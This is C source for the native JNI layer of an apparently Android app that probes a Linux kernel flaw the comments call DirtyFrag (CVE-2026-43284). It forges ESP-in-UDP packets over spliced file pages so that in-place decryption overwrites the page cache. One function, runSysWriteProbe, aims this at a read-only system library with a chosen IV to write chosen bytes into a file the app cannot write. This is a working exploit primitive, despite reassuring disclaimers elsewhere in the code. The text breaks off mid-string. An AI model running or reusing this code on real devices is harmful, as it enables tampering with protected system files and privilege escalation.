#define _GNU_SOURCE
#include <jni.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define PAYLOAD_SIZE 1024

/* v0.4 ESP page-cache probe. The target file page must sit entirely inside the
 * ESP ciphertext region, so the file content is handed to the kernel as
 * ciphertext and decrypted in place. */
#define ESP_HDR_BYTES 8
#define ESP_IV_BYTES 16
#define ESP_PROBE_BYTES 4096

static void appendf(char *buffer, size_t capacity, size_t *used,
                    const char *format, ...) {
    if (*used >= capacity) return;
    va_list args;
    va_start(args, format);
    int written = vsnprintf(buffer + *used, capacity - *used, format, args);
    va_end(args);
    if (written < 0) return;
    size_t remaining = capacity - *used;
    if ((size_t)written >= remaining) {
        *used = capacity - 1;
    } else {
        *used += (size_t)written;
    }
}

static void put_be32(uint8_t *out, uint32_t value) {    out[0] = (uint8_t)((value >> 24) & 0xffU);
    out[1] = (uint8_t)((value >> 16) & 0xffU);
    out[2] = (uint8_t)((value >> 8) & 0xffU);
    out[3] = (uint8_t)(value & 0xffU);
}

static int write_all(int fd, const uint8_t *data, size_t length) {    size_t done = 0;
    while (done < length) {
        ssize_t n = write(fd, data + done, length - done);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) return -1;
        done += (size_t)n;
    }
    return 0;
}

static int pread_all(int fd, uint8_t *data, size_t length) {
    size_t done = 0;
    while (done < length) {
        ssize_t n = pread(fd, data + done, length - done, (off_t)done);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) return -1;
        done += (size_t)n;
    }
    return 0;
}

JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runFileBackedUdpProbe(
        JNIEnv *env, jobject thiz, jstring cache_dir_path) {
    (void)thiz;
    char report[4096] = {0};
    size_t used = 0;
    const char *cache_dir = (*env)->GetStringUTFChars(env, cache_dir_path, NULL);
    if (cache_dir == NULL) return NULL;

    char path[PATH_MAX] = {0};
    int path_created = 0;
    int write_fd = -1;
    int file_fd = -1;
    int rx_fd = -1;
    int tx_fd = -1;
    int probe_ok = 0;
    int cleanup_ok = 1;
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t before[PAYLOAD_SIZE];
    uint8_t after[PAYLOAD_SIZE];
    uint8_t received[PAYLOAD_SIZE + 1];

    for (size_t i = 0; i < sizeof(expected); ++i) {
        expected[i] = (uint8_t)((i * 37U + 11U) & 0xffU);
    }

    int path_len = snprintf(path, sizeof(path), "%s/p780-sendfile-probe-%ld.tmp",
                            cache_dir, (long)getpid());
    if (path_len < 0 || (size_t)path_len >= sizeof(path)) {
        appendf(report, sizeof(report), &used, "FAIL: temporary path is too long.\n");
        goto cleanup;
    }

    write_fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    if (write_fd < 0) {
        appendf(report, sizeof(report), &used,
                "1. Create app-private temporary file: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    path_created = 1;

    if (write_all(write_fd, expected, sizeof(expected)) != 0) {
        appendf(report, sizeof(report), &used,
                "1. Write temporary file: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (fsync(write_fd) != 0) {
        appendf(report, sizeof(report), &used,
                "1. Sync temporary file: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (close(write_fd) != 0) {
        write_fd = -1;
        appendf(report, sizeof(report), &used,
                "1. Close temporary file writer: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    write_fd = -1;

    file_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (file_fd < 0 || pread_all(file_fd, before, sizeof(before)) != 0
            || memcmp(before, expected, sizeof(expected)) != 0) {
        appendf(report, sizeof(report), &used,
                "1. Create/read app-private temporary file: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "1. Create app-private temporary file: PASS; %d bytes\n",
            PAYLOAD_SIZE);

    rx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (rx_fd < 0) {
        appendf(report, sizeof(report), &used,
                "2. Create loopback UDP receiver: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    struct timeval timeout = {2, 0};
    if (setsockopt(rx_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
        appendf(report, sizeof(report), &used,
                "2. Set receive timeout: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    struct sockaddr_in receiver = {0};
    receiver.sin_family = AF_INET;
    receiver.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    receiver.sin_port = 0;
    if (bind(rx_fd, (struct sockaddr *)&receiver, sizeof(receiver)) != 0) {
        appendf(report, sizeof(report), &used,
                "2. Bind loopback UDP receiver: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    socklen_t receiver_len = sizeof(receiver);
    if (getsockname(rx_fd, (struct sockaddr *)&receiver, &receiver_len) != 0) {
        appendf(report, sizeof(report), &used,
                "2. Read loopback UDP port: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    tx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (tx_fd < 0) {
        appendf(report, sizeof(report), &used,
                "2. Create loopback UDP sender: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (connect(tx_fd, (struct sockaddr *)&receiver, sizeof(receiver)) != 0) {
        appendf(report, sizeof(report), &used,
                "2. Connect loopback UDP sender: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    off_t offset = 0;
    ssize_t sent = sendfile(tx_fd, file_fd, &offset, sizeof(expected));
    if (sent < 0) {
        appendf(report, sizeof(report), &used,
                "3. sendfile(file -> UDP loopback): FAIL; errno=%d (%s); no retry\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (sent != (ssize_t)sizeof(expected)) {
        appendf(report, sizeof(report), &used,
                "3. sendfile(file -> UDP loopback): FAIL; sent %zd/%d bytes; no retry\n",
                sent, PAYLOAD_SIZE);
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "3. sendfile(file -> UDP loopback): PASS; one call returned %zd bytes\n", sent);

    ssize_t received_len = recvfrom(rx_fd, received, sizeof(received), 0, NULL, NULL);
    if (received_len < 0) {
        appendf(report, sizeof(report), &used,
                "4. Receive UDP datagram: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (received_len != (ssize_t)sizeof(expected)
            || memcmp(received, expected, sizeof(expected)) != 0) {
        appendf(report, sizeof(report), &used,
                "4. Receive/compare UDP datagram: FAIL; received %zd bytes or payload mismatch\n",
                received_len);
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "4. Receive/compare UDP datagram: PASS; one %zd-byte datagram matched\n",
            received_len);

    if (pread_all(file_fd, after, sizeof(after)) != 0
            || memcmp(before, after, sizeof(before)) != 0
            || memcmp(after, expected, sizeof(expected)) != 0) {
        appendf(report, sizeof(report), &used,
                "5. Source file integrity: FAIL; bytes changed or read failed\n");
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "5. Source file integrity: PASS; pre/post bytes identical\n");
    probe_ok = 1;

cleanup:
    if (write_fd >= 0 && close(write_fd) != 0) cleanup_ok = 0;
    if (file_fd >= 0 && close(file_fd) != 0) cleanup_ok = 0;
    if (rx_fd >= 0 && close(rx_fd) != 0) cleanup_ok = 0;
    if (tx_fd >= 0 && close(tx_fd) != 0) cleanup_ok = 0;
    if (path_created && unlink(path) != 0) {
        cleanup_ok = 0;
        appendf(report, sizeof(report), &used,
                "Cleanup warning: temporary file unlink failed; errno=%d (%s)\n",
                errno, strerror(errno));
    } else if (path_created) {
        appendf(report, sizeof(report), &used, "Cleanup: temporary file removed.\n");
    }
    appendf(report, sizeof(report), &used,
            "No IPsec transform or ESP packet was used; no exploit-style page-cache manipulation was attempted.\n");
    if (probe_ok && cleanup_ok) {
        appendf(report, sizeof(report), &used,
                "PASS indicates file-backed sendfile-to-UDP loopback only; NOT DirtyFrag.\n");
    } else {
        appendf(report, sizeof(report), &used,
                "Probe did not fully pass; this is not a DirtyFrag vulnerability verdict.\n");
    }

    jstring result = (*env)->NewStringUTF(env, report);
    (*env)->ReleaseStringUTFChars(env, cache_dir_path, cache_dir);
    return result;
}

/* Valid-ESP variant: the caller (Java) has already encrypted a well-formed
 * transport-mode payload and computed a correct ICV for the SA, so the kernel
 * should accept the packet. The ciphertext lives in the app-private file, so a
 * successful in-place decryption rewrites that file's page cache with the
 * caller-supplied plaintext. */
JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runValidEspSend(
        JNIEnv *env, jobject thiz, jstring path_string, jint spi, jint encap_port,
        jbyteArray iv_array, jbyteArray icv_array, jbyteArray expected_array) {
    (void)thiz;
    char report[4096] = {0};
    size_t used = 0;
    const char *path = (*env)->GetStringUTFChars(env, path_string, NULL);
    if (path == NULL) return NULL;

    int file_fd = -1;
    int tx_fd = -1;
    int pipe_fd[2] = {-1, -1};
    jsize iv_len = (*env)->GetArrayLength(env, iv_array);
    jsize icv_len = (*env)->GetArrayLength(env, icv_array);
    jsize expect_len = (*env)->GetArrayLength(env, expected_array);
    unsigned char iv[32] = {0};
    unsigned char icv[32] = {0};
    if (iv_len > 32 || icv_len > 32) {
        appendf(report, sizeof(report), &used, "FAIL: IV/ICV too long\n");
        goto cleanup;
    }
    (*env)->GetByteArrayRegion(env, iv_array, 0, iv_len, (jbyte *)iv);
    (*env)->GetByteArrayRegion(env, icv_array, 0, icv_len, (jbyte *)icv);

    file_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (file_fd < 0) {
        appendf(report, sizeof(report), &used,
                "V1. Open ciphertext file: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    off_t size = lseek(file_fd, 0, SEEK_END);
    if (size <= 0 || size > 8192) {
        appendf(report, sizeof(report), &used, "V1. Unexpected ciphertext size %lld\n",
                (long long)size);
        goto cleanup;
    }
    if (lseek(file_fd, 0, SEEK_SET) != 0) {
        appendf(report, sizeof(report), &used, "V1. Rewind failed; errno=%d\n", errno);
        goto cleanup;
    }

    unsigned char header[24] = {0};
    put_be32(header, (uint32_t)spi);
    put_be32(header + 4, 1U);
    memcpy(header + 8, iv, (size_t)(iv_len < 16 ? iv_len : 16));

    tx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (tx_fd < 0) {
        appendf(report, sizeof(report), &used,
                "V2. Socket: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    target.sin_port = htons((uint16_t)encap_port);
    if (connect(tx_fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
        appendf(report, sizeof(report), &used,
                "V2. Connect: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }

    if (pipe(pipe_fd) != 0) {
        appendf(report, sizeof(report), &used, "V3. Pipe: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    if (write_all(pipe_fd[1], header, sizeof(header)) != 0) {
        appendf(report, sizeof(report), &used, "V3. Stage header: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    off_t offset = 0;
    ssize_t spliced_in = splice(file_fd, &offset, pipe_fd[1], NULL, (size_t)size, 0);
    if (spliced_in != (ssize_t)size) {
        appendf(report, sizeof(report), &used,
                "V3. splice(ciphertext -> pipe): FAIL; %zd/%lld, errno=%d\n",
                spliced_in, (long long)size, errno);
        goto cleanup;
    }
    if (write_all(pipe_fd[1], icv, (size_t)icv_len) != 0) {
        appendf(report, sizeof(report), &used, "V3. Stage ICV: FAIL; errno=%d\n", errno);
        goto cleanup;
    }

    ssize_t sent = splice(pipe_fd[0], NULL, tx_fd, NULL,
                          sizeof(header) + (size_t)size + (size_t)icv_len, 0);
    if (sent != (ssize_t)(sizeof(header) + (size_t)size + (size_t)icv_len)) {
        appendf(report, sizeof(report), &used,
                "V4. splice(pipe -> UDP): FAIL; %zd, errno=%d (%s)\n",
                sent, errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "V4. Sent valid ESP datagram: PASS; %zd bytes (%lld ciphertext)\n",
            sent, (long long)size);

    unsigned char after[65536];
    if (pread_all(file_fd, after, (size_t)size) != 0) {
        appendf(report, sizeof(report), &used, "V5. Read back: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    size_t head_match = 0;
    jsize cmp_len = expect_len < size ? expect_len : (jsize)size;
    unsigned char expect[1024];
    if (cmp_len > (jsize)sizeof(expect)) cmp_len = (jsize)sizeof(expect);
    (*env)->GetByteArrayRegion(env, expected_array, 0, cmp_len, (jbyte *)expect);
    for (jsize i = 0; i < cmp_len; ++i) {
        if (after[i] == expect[i]) head_match++;
    }
    appendf(report, sizeof(report), &used,
            "V5. Page now matches expected plaintext in %zu/%d leading bytes\n",
            head_match, (int)cmp_len);
    if (head_match == (size_t)cmp_len && cmp_len > 0) {
        appendf(report, sizeof(report), &used,
                "VERDICT V: IN-PLACE WRITE CONFIRMED. The kernel decrypted a valid "
                "ESP packet directly on top of the spliced file page.\n");
    } else {
        appendf(report, sizeof(report), &used,
                "VERDICT V: page did not receive the expected plaintext.\n");
    }

cleanup:
    if (file_fd >= 0) close(file_fd);
    if (tx_fd >= 0) close(tx_fd);
    if (pipe_fd[0] >= 0) close(pipe_fd[0]);
    if (pipe_fd[1] >= 0) close(pipe_fd[1]);

    jstring result = (*env)->NewStringUTF(env, report);
    (*env)->ReleaseStringUTFChars(env, path_string, path);
    return result;
}

/* System-file variant: the ciphertext block comes from a read-only system
 * library, the IV is chosen by the caller so that the decrypted first block is
 * exactly the desired marker, and the trailing block carries valid ESP padding
 * so the kernel accepts the packet. Proves the primitive writes into a file the
 * app cannot write. */
JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runSysWriteProbe(
        JNIEnv *env, jobject thiz, jstring path_string, jint offset, jint spi,
        jint encap_port, jint seq, jbyteArray iv_array, jbyteArray tail_array,
        jbyteArray icv_array) {
    (void)thiz;
    char report[4096] = {0};
    size_t used = 0;
    const char *path = (*env)->GetStringUTFChars(env, path_string, NULL);
    if (path == NULL) return NULL;

    int file_fd = -1;
    int tx_fd = -1;
    int pipe_fd[2] = {-1, -1};
    unsigned char iv[16];
    unsigned char tail[32];
    unsigned char icv[32];
    if ((*env)->GetArrayLength(env, iv_array) != 16) {
        appendf(report, sizeof(report), &used, "FAIL: IV must be 16 bytes\n");
        goto cleanup;
    }
    (*env)->GetByteArrayRegion(env, iv_array, 0, 16, (jbyte *)iv);
    jsize tail_len = (*env)->GetArrayLength(env, tail_array);
    jsize icv_len = (*env)->GetArrayLength(env, icv_array);
    if (tail_len > (jsize)sizeof(tail) || icv_len > (jsize)sizeof(icv)) {
        appendf(report, sizeof(report), &used, "FAIL: tail/ICV too long\n");
        goto cleanup;
    }
    (*env)->GetByteArrayRegion(env, tail_array, 0, tail_len, (jbyte *)tail);
    (*env)->GetByteArrayRegion(env, icv_array, 0, icv_len, (jbyte *)icv);

    file_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (file_fd < 0) {
        appendf(report, sizeof(report), &used,
                "S1. Open system file O_RDONLY: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "S1. Open read-only system file: PASS (offset 0x%x)\n", (int)offset);

    unsigned char header[24] = {0};
    put_be32(header, (uint32_t)spi);
    put_be32(header + 4, (uint32_t)seq);
    memcpy(header + 8, iv, 16);

    tx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (tx_fd < 0) {
        appendf(report, sizeof(report), &used, "S2. Socket: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    target.sin_port = htons((uint16_t)encap_port);
    if (connect(tx_fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
        appendf(report, sizeof(report), &used, "S2. Connect: FAIL; errno=%d\n", errno);
        goto cleanup;
    }

    if (pipe(pipe_fd) != 0) {
        appendf(report, sizeof(report), &used, "S3. Pipe: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    if (write_all(pipe_fd[1], header, sizeof(header)) != 0) {
        appendf(report, sizeof(report), &used, "S3. Header: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    off_t splice_off = (off_t)offset;
    ssize_t got = splice(file_fd, &splice_off, pipe_fd[1], NULL, 16, 0);
    if (got != 16) {
        appendf(report, sizeof(report), &used,
                "S3. splice(system block -> pipe): FAIL; %zd, errno=%d (%s)\n",
                got, errno, strerror(errno));
        goto cleanup;
    }
    if (write_all(pipe_fd[1], tail, (size_t)tail_len) != 0
            || write_all(pipe_fd[1], icv, (size_t)icv_len) != 0) {
        appendf(report, sizeof(report), &used, "S3. Tail/ICV: FAIL; errno=%d\n", errno);
        goto cleanup;
    }
    ssize_t sent = splice(pipe_fd[0], NULL, tx_fd, NULL,
                          sizeof(header) + 16 + (size_t)tail_len + (size_t)icv_len, 0);
    if (sent <= 0) {
        appendf(report, sizeof(report), &used,
                "S4. splice(pipe -> UDP): FAIL; %zd, errno=%d (%s)\n",
                sent, errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "S4. Sent %zd-byte valid ESP datagram with a system file page: PASS\n", sent);

cleanup:
    if (file_fd >= 0) close(file_fd);
    if (tx_fd >= 0) close(tx_fd);
    if (pipe_fd[0] >= 0) close(pipe_fd[0]);
    if (pipe_fd[1] >= 0) close(pipe_fd[1]);

    jstring result = (*env)->NewStringUTF(env, report);
    (*env)->ReleaseStringUTFChars(env, path_string, path);
    return result;
}

/* Second staging strategy: put the 24-byte ESP header inside the target file and
 * hand the whole file to sendfile(). Kernel 5.4 implements sendfile-to-UDP via
 * sock_sendpage -> udp_sendpage -> ip_append_page, which builds page frags
 * without a frag_list. The first 24 bytes are pulled into the linear area by
 * esp_input(), so the decrypt store starts at file offset 24. */
#define ESP_SENDFILE_CT 2048
#define ESP_SENDFILE_TOTAL (ESP_HDR_BYTES + ESP_IV_BYTES + ESP_SENDFILE_CT)

JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runEspSendfileProbe(
        JNIEnv *env, jobject thiz, jstring cache_dir_path, jint spi,
        jint encap_port) {
    (void)thiz;
    char report[4096] = {0};
    size_t used = 0;
    const char *cache_dir = (*env)->GetStringUTFChars(env, cache_dir_path, NULL);
    if (cache_dir == NULL) return NULL;

    char path[PATH_MAX] = {0};
    int created = 0;
    int write_fd = -1;
    int file_fd = -1;
    int tx_fd = -1;
    uint8_t content[ESP_SENDFILE_TOTAL];
    uint8_t before[ESP_SENDFILE_TOTAL];
    uint8_t after[ESP_SENDFILE_TOTAL];
    ssize_t sent = -1;
    int send_errno = 0;
    size_t changed = 0;
    size_t first_diff = 0;
    int first_diff_found = 0;

    for (size_t i = 0; i < sizeof(content); ++i) {
        content[i] = (uint8_t)((i * 197U + 23U) & 0xffU);
    }
    put_be32(content, (uint32_t)spi);
    put_be32(content + 4, 1U);
    memset(content + ESP_HDR_BYTES, 0xcc, ESP_IV_BYTES);

    int path_len = snprintf(path, sizeof(path), "%s/p780-esp-sendfile-%ld.bin",
                            cache_dir, (long)getpid());
    if (path_len < 0 || (size_t)path_len >= sizeof(path)) {
        appendf(report, sizeof(report), &used, "FAIL: temporary path is too long.\n");
        goto cleanup;
    }

    write_fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0444);
    if (write_fd < 0 || write_all(write_fd, content, sizeof(content)) != 0
            || fsync(write_fd) != 0) {
        appendf(report, sizeof(report), &used,
                "B1. Create app-private 0444 target: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    created = 1;
    if (close(write_fd) != 0) {
        write_fd = -1;
        appendf(report, sizeof(report), &used,
                "B1. Close target writer: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    write_fd = -1;

    file_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (file_fd < 0 || pread_all(file_fd, before, sizeof(before)) != 0) {
        appendf(report, sizeof(report), &used,
                "B1. Reopen target O_RDONLY: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "B1. App-private 0444 target: PASS; %d bytes (24 B ESP header + %d B ciphertext)\n",
            ESP_SENDFILE_TOTAL, ESP_SENDFILE_CT);

    tx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (tx_fd < 0) {
        appendf(report, sizeof(report), &used,
                "B2. Create UDP sender: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    target.sin_port = htons((uint16_t)encap_port);
    if (connect(tx_fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
        appendf(report, sizeof(report), &used,
                "B2. Connect to 127.0.0.1:%d: FAIL; errno=%d (%s)\n",
                (int)encap_port, errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "B2. Loopback UDP sender connected to 127.0.0.1:%d: PASS\n", (int)encap_port);

    off_t offset = 0;
    sent = sendfile(tx_fd, file_fd, &offset, sizeof(content));
    send_errno = errno;
    if (sent != (ssize_t)sizeof(content)) {
        appendf(report, sizeof(report), &used,
                "B3. sendfile(file -> UDP): FAIL; returned %zd, errno=%d (%s)\n",
                sent, send_errno, strerror(send_errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "B3. sendfile(file -> UDP): PASS; one %zd-byte datagram\n", sent);

    if (pread_all(file_fd, after, sizeof(after)) != 0) {
        appendf(report, sizeof(report), &used,
                "B4. Read back: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    for (size_t i = 0; i < sizeof(after); ++i) {
        if (after[i] != before[i]) {
            if (!first_diff_found) {
                first_diff = i;
                first_diff_found = 1;
            }
            ++changed;
        }
    }
    if (changed == 0) {
        appendf(report, sizeof(report), &used,
                "B4. Read back: no change observed\n");
        appendf(report, sizeof(report), &used,
                "VERDICT B: NO WRITE OBSERVED via sendfile staging.\n");
    } else {
        appendf(report, sizeof(report), &used,
                "B4. Read back: %zu of %d bytes changed; first difference at offset %zu\n",
                changed, ESP_SENDFILE_TOTAL, first_diff);
        appendf(report, sizeof(report), &used,
                "VERDICT B: PAGE-CACHE WRITE OBSERVED via sendfile staging.\n");
    }

cleanup:
    if (write_fd >= 0) close(write_fd);
    if (file_fd >= 0) close(file_fd);
    if (tx_fd >= 0) close(tx_fd);
    if (created && unlink(path) == 0) {
        appendf(report, sizeof(report), &used, "Cleanup: app-private target removed.\n");
    }

    jstring result = (*env)->NewStringUTF(env, report);
    (*env)->ReleaseStringUTFChars(env, cache_dir_path, cache_dir);
    return result;
}

/*
 * v0.4 DirtyFrag (CVE-2026-43284) page-cache write probe.
 *
 * Scope: one app-private 4096-byte file, opened read-only, spliced into a pipe
 * behind a forged ESP header, and handed to a loopback UDP socket that the Java
 * layer has bound as an ESP-in-UDP encapsulation socket with a matching SA.
 *
 * If the running kernel takes the esp_input() skip_cow branch for a non-linear
 * skb without a frag_list, the in-place AEAD decryption writes into the page
 * cache page of that file and the read-back bytes change.
 *
 * No system file, no other app's data, no kernel module and no privilege
 * escalation step is involved. Authentication of the forged ESP packet is
 * expected to fail; the write happens before that check.
 */
JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runEspPageCacheProbe(
        JNIEnv *env, jobject thiz, jstring cache_dir_path, jint spi,
        jint encap_port) {
    (void)thiz;
    char report[6144] = {0};
    size_t used = 0;
    const char *cache_dir = (*env)->GetStringUTFChars(env, cache_dir_path, NULL);
    if (cache_dir == NULL) return NULL;

    char path[PATH_MAX] = {0};
    int created = 0;
    int write_fd = -1;
    int file_fd = -1;
    int tx_fd = -1;
    int pipe_fd[2] = {-1, -1};
    uint8_t pattern[ESP_PROBE_BYTES];
    uint8_t before[ESP_PROBE_BYTES];
    uint8_t after[ESP_PROBE_BYTES];
    uint8_t header[ESP_HDR_BYTES + ESP_IV_BYTES];
    ssize_t spliced = -1;
    ssize_t file_spliced = -1;
    int send_errno = 0;
    size_t changed = 0;
    size_t first_diff = 0;
    int first_diff_found = 0;

    for (size_t i = 0; i < sizeof(pattern); ++i) {
        pattern[i] = (uint8_t)((i * 131U + 7U) & 0xffU);
    }
    put_be32(header, (uint32_t)spi);      /* ESP SPI */
    put_be32(header + 4, 1U);             /* ESP sequence number */
    memset(header + ESP_HDR_BYTES, 0xcc, ESP_IV_BYTES);  /* IV is irrelevant here */

    int path_len = snprintf(path, sizeof(path), "%s/p780-esp-page-probe-%ld.bin",
                            cache_dir, (long)getpid());
    if (path_len < 0 || (size_t)path_len >= sizeof(path)) {
        appendf(report, sizeof(report), &used, "FAIL: temporary path is too long.\n");
        goto cleanup;
    }

    write_fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0444);
    if (write_fd < 0) {
        appendf(report, sizeof(report), &used,
                "1. Create app-private read-only target: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    created = 1;
    if (write_all(write_fd, pattern, sizeof(pattern)) != 0 || fsync(write_fd) != 0) {
        appendf(report, sizeof(report), &used,
                "1. Create app-private read-only target: FAIL; write/fsync errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    if (close(write_fd) != 0) {
        write_fd = -1;
        appendf(report, sizeof(report), &used,
                "1. Close target writer: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    write_fd = -1;

    file_fd = open(path, O_RDONLY | O_CLOEXEC);
    if (file_fd < 0 || pread_all(file_fd, before, sizeof(before)) != 0
            || memcmp(before, pattern, sizeof(pattern)) != 0) {
        appendf(report, sizeof(report), &used,
                "1. Create app-private read-only target: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "1. App-private 0444 target file: PASS; %d bytes, opened O_RDONLY\n",
            ESP_PROBE_BYTES);

    tx_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_UDP);
    if (tx_fd < 0) {
        appendf(report, sizeof(report), &used,
                "2. Create loopback UDP sender: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    target.sin_port = htons((uint16_t)encap_port);
    if (connect(tx_fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
        appendf(report, sizeof(report), &used,
                "2. Connect sender to 127.0.0.1:%d: FAIL; errno=%d (%s)\n",
                (int)encap_port, errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "2. Loopback UDP sender connected to 127.0.0.1:%d: PASS\n", (int)encap_port);

    if (pipe(pipe_fd) != 0) {
        appendf(report, sizeof(report), &used,
                "3. Create pipe: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }

    if (write_all(pipe_fd[1], header, sizeof(header)) != 0) {
        appendf(report, sizeof(report), &used,
                "3. Stage forged ESP header in pipe: FAIL; errno=%d (%s)\n",
                errno, strerror(errno));
        goto cleanup;
    }

    off_t offset = 0;
    file_spliced = splice(file_fd, &offset, pipe_fd[1], NULL, sizeof(pattern), 0);
    if (file_spliced != (ssize_t)sizeof(pattern)) {
        appendf(report, sizeof(report), &used,
                "3. splice(file -> pipe): FAIL; returned %zd, errno=%d (%s)\n",
                file_spliced, errno, strerror(errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "3. Pipe staged: ESP header %d B + file page %d B: PASS\n",
            (int)sizeof(header), ESP_PROBE_BYTES);

    spliced = splice(pipe_fd[0], NULL, tx_fd, NULL,
                     (size_t)sizeof(header) + sizeof(pattern), 0);
    send_errno = errno;
    if (spliced != (ssize_t)(sizeof(header) + sizeof(pattern))) {
        appendf(report, sizeof(report), &used,
                "4. splice(pipe -> UDP socket): FAIL; returned %zd, errno=%d (%s)\n",
                spliced, send_errno, strerror(send_errno));
        goto cleanup;
    }
    appendf(report, sizeof(report), &used,
            "4. splice(pipe -> UDP socket): PASS; one %zd-byte datagram\n", spliced);

    if (pread_all(file_fd, after, sizeof(after)) != 0) {
        appendf(report, sizeof(report), &used,
                "5. Read back target: FAIL; errno=%d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }

    for (size_t i = 0; i < sizeof(after); ++i) {
        if (after[i] != before[i]) {
            if (!first_diff_found) {
                first_diff = i;
                first_diff_found = 1;
            }
            ++changed;
        }
    }

    if (changed == 0) {
        appendf(report, sizeof(report), &used,
                "5. Read back target: no change observed\n");
        appendf(report, sizeof(report), &used,
                "VERDICT: NO WRITE OBSERVED. Either esp_input() copied the skb "
